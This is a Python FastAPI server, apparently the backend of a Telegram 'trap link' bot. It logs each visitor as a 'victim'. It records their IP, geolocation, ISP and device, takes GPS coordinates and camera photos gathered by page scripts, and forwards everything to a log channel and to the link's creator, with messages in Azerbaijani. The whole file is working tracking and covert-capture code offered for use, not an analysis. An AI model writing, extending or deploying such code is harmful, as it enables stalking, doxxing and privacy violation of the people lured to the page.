from fastapi import FastAPI, Request, HTTPException, File, UploadFile, Form
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
import aiofiles
import os
import json
from datetime import datetime
from sqlalchemy.orm import Session

from config import Config
from database import get_db, TrapURL, VictimData
from utils import send_to_log_channel, send_to_creator, get_ip_info, format_victim_data, get_device_info

app = FastAPI()
config = Config.from_env()

# Setup static files and templates
app.mount("/static", StaticFiles(directory="static"), name="static")
templates = Jinja2Templates(directory="templates")

# Ensure directories exist
os.makedirs("static", exist_ok=True)
os.makedirs("templates", exist_ok=True)
os.makedirs("uploads", exist_ok=True)

@app.get("/")
async def home():
    return {"message": "Telegram Bot Web Interface"}

@app.get("/{trap_name}")
async def trap_page(request: Request, trap_name: str):
    """Serve the trap page"""
    db = next(get_db())
    trap_url = db.query(TrapURL).filter(
        TrapURL.name == trap_name,
        TrapURL.is_active == True
    ).first()
    
    if not trap_url:
        db.close()
        raise HTTPException(status_code=404, detail="Page not found")
    
    # Get client IP
    client_ip = request.client.host
    if "x-forwarded-for" in request.headers:
        client_ip = request.headers["x-forwarded-for"].split(",")[0].strip()
    elif "x-real-ip" in request.headers:
        client_ip = request.headers["x-real-ip"]
    
    # Get IP info immediately
    ip_info = await get_ip_info(client_ip)
    
    # Get user agent
    user_agent = request.headers.get("user-agent", "")
    device_info = get_device_info(user_agent)
    
    # Create initial victim data entry
    victim_data = VictimData(
        trap_url_id=trap_url.id,
        ip_address=client_ip,
        country=ip_info.get("country"),
        region=ip_info.get("region"),
        city=ip_info.get("city"),
        latitude=ip_info.get("loc", "").split(",")[0] if ip_info.get("loc") else None,
        longitude=ip_info.get("loc", "").split(",")[1] if ip_info.get("loc") and "," in ip_info.get("loc", "") else None,
        isp=ip_info.get("org"),
        user_agent=user_agent,
        device_type=device_info["device_type"],
        browser=device_info["browser"],
        os=device_info["os"],
        camera_permission="not_requested",
        location_permission="not_requested"
    )
    
    db.add(victim_data)
    db.commit()
    
    # Send immediate IP info to both log channel and creator
    immediate_message = f"""
🚨 **Dərhal Bildiriş - {trap_name}**

🌐 **IP:** `{client_ip}`
🏳️ **Ölkə:** {ip_info.get('country', 'Bilinmir')}
🏙️ **Şəhər:** {ip_info.get('city', 'Bilinmir')}
🌐 **ISP:** {ip_info.get('org', 'Bilinmir')}
📱 **Cihaz:** {device_info['device_type']} - {device_info['browser']} - {device_info['os']}

⏰ **Vaxt:** {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}
    """
    
    # Send to log channel
    await send_to_log_channel(immediate_message)
    
    # Send to creator
    await send_to_creator(trap_url.creator_id, immediate_message)
    
    db.close()
    
    # Return the trap page with the uploaded image
    return templates.TemplateResponse("trap_page.html", {
        "request": request,
        "trap_name": trap_name,
        "image_path": trap_url.image_path,
        "victim_id": victim_data.id
    })

@app.post("/api/capture")
async def capture_data(request: Request):
    """Capture victim data from JavaScript"""
    try:
        data = await request.json()
        victim_id = data.get("victim_id")
        
        if not victim_id:
            raise HTTPException(status_code=400, detail="Victim ID required")
        
        db = next(get_db())
        victim_data = db.query(VictimData).filter(VictimData.id == victim_id).first()
        
        if not victim_data:
            db.close()
            raise HTTPException(status_code=404, detail="Victim data not found")
        
        # Update victim data with captured information
        if "camera_permission" in data:
            victim_data.camera_permission = data["camera_permission"]
        
        if "location_permission" in data:
            victim_data.location_permission = data["location_permission"]
        
        if "gps_latitude" in data and "gps_longitude" in data:
            victim_data.gps_latitude = str(data["gps_latitude"])
            victim_data.gps_longitude = str(data["gps_longitude"])
            victim_data.gps_accuracy = str(data.get("gps_accuracy", ""))
        
        db.commit()
        
        # Get trap info
        trap_url = victim_data.trap_url
        
        # Format and send updated data
        victim_dict = {
            "ip_address": victim_data.ip_address,
            "country": victim_data.country,
            "region": victim_data.region,
            "city": victim_data.city,
            "isp": victim_data.isp,
            "device_type": victim_data.device_type,
            "browser": victim_data.browser,
            "os": victim_data.os,
            "camera_permission": victim_data.camera_permission,
            "location_permission": victim_data.location_permission,
            "gps_latitude": victim_data.gps_latitude,
            "gps_longitude": victim_data.gps_longitude,
            "accessed_at": victim_data.accessed_at.strftime('%d.%m.%Y %H:%M:%S')
        }
        
        update_message = format_victim_data(victim_dict, trap_url.name)
        
        # Send to log channel
        await send_to_log_channel(update_message)
        
        # Send to creator
        await send_to_creator(trap_url.creator_id, update_message)
        
        db.close()
        
        return {"status": "success"}
        
    except Exception as e:
        print(f"Error capturing data: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.post("/api/upload_photo")
async def upload_photo(
    victim_id: int = Form(...),
    photo: UploadFile = File(...)
):
    """Upload captured photo"""
    try:
        db = next(get_db())
        victim_data = db.query(VictimData).filter(VictimData.id == victim_id).first()
        
        if not victim_data:
            db.close()
            raise HTTPException(status_code=404, detail="Victim data not found")
        
        # Save photo
        photo_filename = f"victim_{victim_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
        photo_path = f"uploads/{photo_filename}"
        
        async with aiofiles.open(photo_path, 'wb') as f:
            content = await photo.read()
            await f.write(content)
        
        # Update victim data
        victim_data.camera_photo_path = photo_path
        db.commit()
        
        # Get trap info
        trap_url = victim_data.trap_url
        
        # Send photo to log channel and creator
        photo_message = f"📸 **Kamera Şəkli - {trap_url.name}**\n\n🆔 Qurban ID: {victim_id}"
        
        # Send to log channel
        await send_to_log_channel(photo_message, photo_path)
        
        # Send to creator
        await send_to_creator(trap_url.creator_id, photo_message, photo_path)
        
        db.close()
        
        return {"status": "success"}
        
    except Exception as e:
        print(f"Error uploading photo: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host=config.HOST, port=config.PORT)
